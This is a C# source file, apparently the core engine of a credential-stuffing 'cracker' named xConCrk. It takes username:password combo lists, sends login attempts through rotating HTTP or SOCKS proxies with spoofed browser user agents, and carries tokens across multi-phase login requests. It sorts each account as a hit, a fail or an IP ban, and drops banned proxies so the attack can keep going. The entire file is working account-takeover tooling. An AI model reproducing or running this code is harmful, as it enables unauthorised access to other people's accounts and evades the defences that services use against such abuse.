using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Shadynet;
using Shadynet.Http;
using Shadynet.Proxy;
using Shadynet.Other;
using System.Threading;

namespace xConCrk
{
    static class ArrayExtensions
    {
        public static string[] ReplaceAll(this string[] items, string oldValue, string newValue)
        {
            for (int index = 0; index < items.Length; index++)
                if (items[index] == oldValue)
                    items[index] = newValue;
            return items;
        }

        public static string[] Replace(this string[] items, string oldValue, string newValue)
        {
            for (int index = 0; index < items.Length; index++)
                items[index].Replace(oldValue, newValue);
            return items;
        }
    }

    public class RawEngine
    {
        public ModsLoader Loader = new ModsLoader();

        public async Task startModsLoader(int preload, bool list = false)
        {
            await Loader.LoadMods(preload, list);
        }

        public List<string> Accounts = new List<string>();
        public List<string> Proxies = new List<string>();

        public ThreadController.ThreadFlags flag = ThreadController.ThreadFlags.Running;

        public string Engine(string userOne, string proxy, int threadindex)
        {
            try
            {
                #region ComboCheck&Assignment

                if (string.IsNullOrEmpty(userOne))
                    return "false";
                userOne = userOne.Trim();
                if (userOne.Length < 10)
                    return "false";
                if (userOne.Contains(";"))
                    userOne = userOne.Replace(';', ':');
                if (!userOne.Contains(":"))
                    return "false";
                string User = userOne.Split(':')[0].Trim();
                if (string.IsNullOrEmpty(User) || (User.Contains(" ")))
                    return "false";
                string password = userOne.Split(':')[1].Trim();

                string[] userCreds = new string[] { User, password, proxy };

                #endregion

                using (HttpRequest req = new HttpRequest())
                {
                    #region ProxyCheckAndSet
                    switch (ProxyTools.GT)
                    {
                        case ProxyTools.GetType.HTTP:
                            req.Proxy = (ProxyClient)HttpProxyClient.Parse(proxy);

                            break;
                        case ProxyTools.GetType.SOCKS:
                            req.Proxy = (ProxyClient)Socks5ProxyClient.Parse(proxy);
                            break;
                    }
                    req.ConnectTimeout = 500;

                    #endregion

                    #region Settings

                    #region UserAgent
                    switch (Loader.GetFun<string>("UserAgent"))
                    {
                        case "$Chrome":
                            req.UserAgent = HttpHelper.ChromeUserAgent();
                            break;

                        case "$Firefox":
                            req.UserAgent = HttpHelper.FirefoxUserAgent();
                            break;

                        case "$Opera":
                            req.UserAgent = HttpHelper.OperaUserAgent();
                            break;

                        case "$OperaMini":
                            req.UserAgent = HttpHelper.OperaMiniUserAgent();
                            break;

                        case "$IE":
                            req.UserAgent = HttpHelper.IEUserAgent();
                            break;

                        default:
                            req.UserAgent = Loader.GetFun<string>("UserAgent");
                            break;
                    }
                    #endregion

                    req.Cookies = new CookieCore(false);

                    req.AllowAutoRedirect = Loader.GetFun<bool>("FollowRedirect");

                    req.IgnoreProtocolErrors = true;

                    if (Loader.GetFun<bool>("UseSSL"))
                        req.SslCertificateValidatorCallback = HttpHelper.AcceptAllCertificationsCallback;

                    req.ConnectTimeout = 1000;
                    #endregion

                    #region Phase1

                    string _headers = string.Empty;
                    string _content = string.Empty;
                    string _cookies = string.Empty;

                    List<string> _tokens = new List<string>();

                    string[] ModPhase1 = new string[] { };

                    var firstData = Loader.GetFun<string>("FirstRequestData").ToString().Replace("$USER", User)
                                                         .Replace("$PASS", password);

                    if (Loader.GetFun<bool>("UseCustomHeaders"))
                    {
                        if (Loader.GetFun<List<Tuple<string, string>>>("BeforeCrackingHeaders") != null &&
                            Loader.GetFun<List<Tuple<string, string>>>("BeforeCrackingHeaders").Count > 0)
                        {
                            foreach (var header in Loader.GetFun<List<Tuple<string, string>>>("BeforeCrackingHeaders"))
                            {
                                req.AddHeader(header.Item1, header.Item2);
                            }
                        }
                    }

                    if (Loader.GetFun<bool>("UseCustomCookies"))
                    {
                        if (Loader.GetFun<List<Tuple<string, string>>>("BeforeCrackingCookies") != null &&
                            Loader.GetFun<List<Tuple<string, string>>>("BeforeCrackingCookies").Count > 0)
                        {
                            var fcookies = Loader.GetFun<List<Tuple<string, string>>>("BeforeCrackingCookies").ToDictionary(x => x.Item1, x => x.Item2);
                            try
                            {
                                req.Cookies.AddDictionary(fcookies);
                            }
                            catch { }
                        }
                    }

                    if (Loader.GetFun<bool>("Phase1FollowRedirect"))
                    {
                        req.AllowAutoRedirect = true;
                    }

                    if (Loader.GetFun<bool>("FirstRequestMethod"))
                    {
                        if (!string.IsNullOrEmpty(Loader.GetFun<string>("Phase1DataType")))
                        {
                            var phase1 = req.Post(Loader.GetFun<string>("FirstRequestURI"), firstData, Loader.GetFun<string>("Phase1DataType"));
                            phase1.Logger(out _headers, out _content, out _cookies);

                            ModPhase1 = (string[])Loader.Compile.ExecuteCode(Loader.starterCode, Loader.starterCodeClass, "FirstRequestToken", false, _content, _headers, _cookies, userCreds, threadindex);
                        }
                        else
                        {
                            req.ParseAddParam(firstData);
                            var phase1 = req.Post(Loader.GetFun<string>("FirstRequestURI"));
                            phase1.Logger(out _headers, out _content, out _cookies);

                            ModPhase1 = (string[])Loader.Compile.ExecuteCode(Loader.starterCode, Loader.starterCodeClass, "FirstRequestToken", false, _content, _headers, _cookies, userCreds, threadindex);
                        }

                    }
                    else
                    {
                        var phase1 = req.Get(Loader.GetFun<string>("FirstRequestURI").ToString() + firstData);
                        phase1.Logger(out _headers, out _content, out _cookies);

                        ModPhase1 = (string[])Loader.Compile.ExecuteCode(Loader.starterCode, Loader.starterCodeClass, "FirstRequestToken", false, _content, _headers, _cookies, userCreds, threadindex);
                    }

                    // reset some phase1 settings
                    if (Loader.GetFun<bool>("Phase1FollowRedirect"))
                    {
                        req.AllowAutoRedirect = Loader.GetFun<bool>("FollowRedirect");
                    }

                    ModPhase1 = ModPhase1.Replace("$ResponseContent", _content)
                                         .Replace("$ResponseHeaders", _headers)
                                         .Replace("$ResponseCookies", _cookies)
                                         .Replace("$USER", User)
                                         .Replace("$PASS", password);


                    if (!Loader.GetFun<bool>("UsePhase2"))
                    {
                        foreach (string res in ModPhase1)
                        {
                            switch (res)
                            {
                                case "$true":
                                    return "true";

                                case "$false":
                                    return "false";

                                case "$error":
                                    return "error";

                                case "$pban":
                                    return "pban";

                                default:
                                    return Loader.GetFun<bool>("DefaultReturnFlag").ToString();
                            }
                        }
                    }
                    #endregion

                    #region Phase2

                    string data = Loader.GetFun<string>("CrackingData")
                                                         .Replace("$USER", User)
                                                         .Replace("$PASS", password)
                                                         .Replace("$ResponseContent", _content)
                                                         .Replace("$ResponseHeaders", _headers)
                                                         .Replace("$ResponseCookies", _cookies);

                    var ICH = Loader.GetFun<List<Tuple<string, string>>>("InCrackingHeaders");
                    var ICC = Loader.GetFun<List<Tuple<string, string>>>("InCrackingCookies");

                    // replacer
                    for (int i = 0; i < ModPhase1.Length; i++)
                    {
                        string currentTokenFormat = string.Format("$TOKEN[{0}]", i);
                        data = data.Replace(currentTokenFormat, ModPhase1[i]);

                        // ich
                        if(ICH != null && ICH.Count > 0)
                        {
                            var ichtm = ICH.Find(s => s.Item1.Contains(currentTokenFormat) || s.Item2.Contains(currentTokenFormat));
                            var index = ICH.FindIndex(x => x == ichtm);
                            lock (ICH)
                            {
                                ICH[index] = Tuple.Create(ichtm.Item1.Replace(currentTokenFormat, ModPhase1[i]), ichtm.Item2.Replace(currentTokenFormat, ModPhase1[i]));
                            }
                        }

                        // icc
                        if(ICC != null && ICC.Count > 0)
                        {
                            var icctm = ICC.Find(s => s.Item1.Contains(currentTokenFormat) || s.Item2.Contains(currentTokenFormat));
                            var index = ICC.FindIndex(x => x == icctm);
                            lock (ICC)
                            {
                                ICC[index] = Tuple.Create(icctm.Item1.Replace(currentTokenFormat, ModPhase1[i]), icctm.Item2.Replace(currentTokenFormat, ModPhase1[i]));
                            }
                        }
                    }

                    string[] ModPhase2 = new string[] { };

                    if (Loader.GetFun<bool>("UseCustomHeaders"))
                    {
                        if (ICH != null && ICH.Count > 0)
                        {
                            foreach (var header in ICH)
                            {
                                req.AddHeader(header.Item1, header.Item2);
                            }
                        }
                    }
                    if (Loader.GetFun<bool>("UseCustomCookies"))
                    {
                        if (ICC != null && ICC.Count > 0)
                        {
                            var fcookies = ICC.ToDictionary(x => x.Item1, x => x.Item2);
                            try
                            {
                                req.Cookies.AddDictionary(fcookies);
                            }
                            catch { }
                        }
                    }

                    if (Loader.GetFun<bool>("GetOrPostCracking"))
                    {
                        if (!string.IsNullOrEmpty(Loader.GetFun<string>("Phase2DataType")))
                        {
                            var phase2 = req.Post(Loader.GetFun<string>("CrackURI"), data, Loader.GetFun<string>("Phase2DataType"));
                            phase2.Logger(out _headers, out _content, out _cookies);
                            
                            ModPhase2 = (string[])Loader.Compile.ExecuteCode(Loader.starterCode, Loader.starterCodeClass, "CrackingURIResponse", false, _content, _headers, _cookies, ModPhase1, userCreds, threadindex);
                        }
                        else
                        {
                            req.ParseAddParam(data);
                            var phase2 = req.Post(Loader.GetFun<string>("CrackURI"));
                            phase2.Logger(out _headers, out _content, out _cookies);
                            
                            ModPhase2 = (string[])Loader.Compile.ExecuteCode(Loader.starterCode, Loader.starterCodeClass, "CrackingURIResponse", false, _content, _headers, _cookies, ModPhase1, userCreds, threadindex);
                        }
                    }
                    else
                    {
                        var phase2 = req.Get(Loader.GetFun<string>("CrackURI") + data);
                        phase2.Logger(out _headers, out _content, out _cookies);
                        
                        ModPhase2 = (string[])Loader.Compile.ExecuteCode(Loader.starterCode, Loader.starterCodeClass, "CrackingURIResponse", false, _content, _headers, _cookies, ModPhase1, userCreds, threadindex);
                    }

                    ModPhase2 = ModPhase2.Replace("$USER", User)
                                                         .Replace("$PASS", password)
                                                         .Replace("$ResponseContent", _content)
                                                         .Replace("$ResponseHeaders", _headers)
                                                         .Replace("$ResponseCookies", _cookies);

                    if (ModPhase2.All(s => s.Contains("$true")))
                    {
                        if (!Loader.GetFun<bool>("UseCaptureRequest"))
                        {
                            return "true";
                        }
                    }
                    if (ModPhase2.All(s => s.Contains("$false")))
                    {
                        return "false";
                    }
                    if (ModPhase2.All(s => s.Contains("$error")))
                    {
                        return "error";
                    }
                    if (ModPhase2.All(s => s.Contains("$pban")))
                    {
                        return "pban";
                    }
                    #endregion

                    #region Phase3
                    // useless
                    string ModPhase3 = "";

                    var capData = Loader.GetFun<string>("CaptureRequestData")
                                                         .Replace("$USER", User)
                                                         .Replace("$PASS", password)
                                                         .Replace("$ResponseContent", _content)
                                                         .Replace("$ResponseHeaders", _headers)
                                                         .Replace("$ResponseCookies", _cookies);

                    ICH = Loader.GetFun<List<Tuple<string, string>>>("CaptureHeaders");
                    ICC = Loader.GetFun<List<Tuple<string, string>>>("CaptureCookies");

                    // replacer
                    for (int i = 0; i < ModPhase2.Length; i++)
                    {
                        string currentTokenFormat = string.Format("$TOKEN[{0}]", i);
                        capData = capData.Replace(currentTokenFormat, ModPhase2[i]);

                        // ich
                        if (ICH != null && ICH.Count > 0)
                        {
                            var ichtm = ICH.Find(s => s.Item1.Contains(currentTokenFormat) || s.Item2.Contains(currentTokenFormat));
                            var index = ICH.FindIndex(x => x == ichtm);
                            lock (ICH)
                            {
                                ICH[index] = Tuple.Create(ichtm.Item1.Replace(currentTokenFormat, ModPhase2[i]), ichtm.Item2.Replace(currentTokenFormat, ModPhase2[i]));
                            }
                        }

                        // icc
                        if (ICC != null && ICC.Count > 0)
                        {
                            var icctm = ICC.Find(s => s.Item1.Contains(currentTokenFormat) || s.Item2.Contains(currentTokenFormat));
                            var index = ICC.FindIndex(x => x == icctm);
                            lock (ICC)
                            {
                                ICC[index] = Tuple.Create(icctm.Item1.Replace(currentTokenFormat, ModPhase2[i]), icctm.Item2.Replace(currentTokenFormat, ModPhase2[i]));
                            }
                        }
                    }

                    if (Loader.GetFun<bool>("UseCustomHeaders"))
                    {
                        if (ICH != null && ICH.Count > 0)
                        {
                            foreach (var header in ICH)
                            {
                                req.AddHeader(header.Item1, header.Item2);
                            }
                        }
                    }

                    if (Loader.GetFun<bool>("UseCustomCookies"))
                    {
                        if (ICC != null && ICC.Count > 0)
                        {
                            var fcookies = ICC.ToDictionary(x => x.Item1, x => x.Item2);
                            try
                            {
                                req.Cookies.AddDictionary(fcookies);
                            }
                            catch { }
                        }
                    }

                    if (Loader.GetFun<bool>("MethodCaptureURI"))
                    {
                        req.AllowAutoRedirect = Loader.GetFun<bool>("FollowRedirect");

                        if (Loader.GetFun<string>("Phase3DataType").Length > 0 &&
                            !string.IsNullOrEmpty(Loader.GetFun<string>("Phase3DataType")))
                        {
                            var phase3 = req.Post(Loader.GetFun<string>("CaptureURI"), capData, Loader.GetFun<string>("Phase3DataType"));
                            phase3.Logger(out _headers, out _content, out _cookies);

                            ModPhase3 = Loader.Compile.ExecuteCode(Loader.starterCode, Loader.starterCodeClass, "CrackingURIResponse", false, _content, _headers, _cookies, userCreds, threadindex).ToString();
                        }
                        else
                        {
                            req.ParseAddParam(capData);
                            var phase3 = req.Post(Loader.GetFun<string>("CaptureURI"));
                            phase3.Logger(out _headers, out _content, out _cookies);
                            
                            ModPhase3 = Loader.Compile.ExecuteCode(Loader.starterCode, Loader.starterCodeClass, "CrackingURIResponse", false, _content, _headers, _cookies, userCreds, threadindex).ToString();
                        }
                    }
                    else
                    {
                        req.AllowAutoRedirect = Loader.GetFun<bool>("FollowRedirect");
                        var phase3 = req.Get(Loader.GetFun<string>("CaptureURI") + capData);
                        phase3.Logger(out _headers, out _content, out _cookies);
                        
                        ModPhase3 = Loader.Compile.ExecuteCode(Loader.starterCode, Loader.starterCodeClass, "CaptureURIResponse", false, _content, _headers, _cookies, userCreds, threadindex).ToString();
                    }

                    ModPhase3 = ModPhase3.Replace("$USER", User)
                                         .Replace("$PASS", password);

                    if (ModPhase3.Contains("$true"))
                    {
                        return "true";
                    }
                    if (ModPhase3.Contains("$false"))
                    {
                        return "false";
                    }
                    if (ModPhase3.Contains("$error"))
                    {
                        return "error";
                    }
                    if (ModPhase3.Contains("$pban"))
                    {
                        return "pban";
                    }
                    #endregion
                }
            }

            // todo: add code handler on the script
            catch (Exception e)
            {
                if (Loader.GetFun<bool>("Debug"))
                {
                    Logger.err("Eng Exception: {0} -> {1} -> {2}", e.Message, e.TargetSite, e.StackTrace);
                }
                return "pban";
            }
            return Loader.GetFun<bool>("DefaultReturnFlag").ToString();
        }

        public ResponseTypes ResponseParser(string res)
        {
            switch (res)
            {
                case "true":
                    return ResponseTypes.Success;

                case "false":
                    return ResponseTypes.Fail;

                case "error":
                    return ResponseTypes.Error;

                case "pban":
                    return ResponseTypes.IpBan;

                default:
                    return ResponseTypes.UnknownResponse;
            }
        }

        public void ResponseHandler(ResponseTypes Response, string account, string proxy)
        {
            switch (Response)
            {
                case ResponseTypes.Success:
                    break;

                case ResponseTypes.Error:
                    Accounts.Add(account);
                    break;

                case ResponseTypes.Fail:
                    break;

                case ResponseTypes.IpBan:
                    if (Proxies.Count <= 0)
                        flag = ThreadController.ThreadFlags.Stop;
                    if (Loader.GetFun<bool>("RemoveBadProxies"))
                    {
                        lock(Proxies)
                            Proxies.Remove(proxy);
                    }
                    break;
            }
        }

        public string[] Split(string value, string separator)
        {
            int startIndex = 0;
            List<string> data = new List<string>();

            int maxIndex = value.Length - separator.Length;
            for (int i = 0; i < maxIndex; i++)
            {
                bool matchFound = true;
                for (int n = 0; n < separator.Length && (n + i) < value.Length; n++)
                {
                    if (value[i + n] != separator[n])
                    {
                        matchFound = false;
                        break;
                    }
                }

                if (matchFound)
                {
                    data.Add(value.Substring(startIndex, i + separator.Length - startIndex - separator.Length));
                    startIndex = i + separator.Length;
                    i += separator.Length - 1;
                }
            }

            data.Add(value.Substring(startIndex, value.Length - startIndex));
            return data.ToArray();
        }

        public enum ResponseTypes
        {
            Success,
            Fail,
            Error,
            IpBan,
            UnknownResponse
        }
    }
}
